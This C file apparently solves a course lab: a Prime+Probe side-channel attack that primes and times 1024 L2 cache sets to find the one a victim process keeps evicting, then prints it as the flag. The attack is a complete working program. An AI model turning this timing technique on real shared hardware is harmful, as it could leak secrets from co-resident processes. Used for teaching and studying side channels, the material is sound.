#include "common.h"
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define BUFF_SIZE (1 << 21)
#define NSESTS 1024
#define NWAYS 16 // as long as >= 4
#define ROUNDS 200
#define THRESHOLD 120
#define WAITCYCLES 2000

// waits n cycles
static void wait(int n)
{
    while (n--)
        asm volatile("" ::: "memory");
}

int main()
{
    void *buf =
        mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
             MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    if (buf == (void *)-1)
    {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    memset(buf, 0x1, BUFF_SIZE);

    // Warmup
    for (int i = 0; i < 1000000; i++)
        measure_one_block_access_time((uint64_t)buf);

    int flag = -1;

    // TODO: Implement your attack here
    // Target L2

    // fixed random probe order, built once so rand() stays out of the hot
    // loop and the prefetcher can't predict our access pattern
    srand(time(NULL) ^ getpid());
    int order[NWAYS];
    for (int k = 0; k < NWAYS; k++)
        order[k] = k;
    for (int k = NWAYS - 1; k > 0; k--)
    {
        int j = rand() % (k + 1);
        int t = order[k];
        order[k] = order[j];
        order[j] = t;
    }

    // sum probe latency per L2 set over many rounds; the victim keeps one set
    // (= flag) evicted, so it reads slowest. compare sets to each other.
    long score[NSESTS] = {0};

    for (int r = 0; r < ROUNDS; r++)
    {
        for (int s = 0; s < NSESTS; s++)
        {
            // lines for set s: same set bits (s << 6), different tag (k << 16)
            ADDR_PTR base = (ADDR_PTR)buf + ((ADDR_PTR)s << 6);

            // prime: fill set s with our own lines (plain loads, low footprint)
            for (int k = 0; k < NWAYS; k++)
                *(volatile char *)(base + ((ADDR_PTR)order[k] << 16));

            wait(WAITCYCLES);

            // probe: the more the victim evicted us, the slower this reads
            for (int k = 0; k < NWAYS; k++)
            {
                CYCLES t = measure_one_block_access_time(
                    base + ((ADDR_PTR)order[k] << 16));
                if (t > THRESHOLD * 4) // cap interrupt/outlier spikes
                    t = THRESHOLD * 4;
                score[s] += t;
            }
        }
    }

    // the slowest set is the one the victim keeps touching
    long best = -1;
    for (int s = 0; s < NSESTS; s++)
        if (score[s] > best)
        {
            best = score[s];
            flag = s;
        }

    // DEBUG: top-5 sets, so you can see if the flag stands out (stderr only)
    for (int n = 0; n < 5; n++)
    {
        int b = 0;
        for (int s = 0; s < NSESTS; s++)
            if (score[s] > score[b])
                b = s;
        fprintf(stderr, "  set %4d : %ld\n", b, score[b]);
        score[b] = -1;
    }

    printf("Flag: %d\n", flag);
    return 0;
}
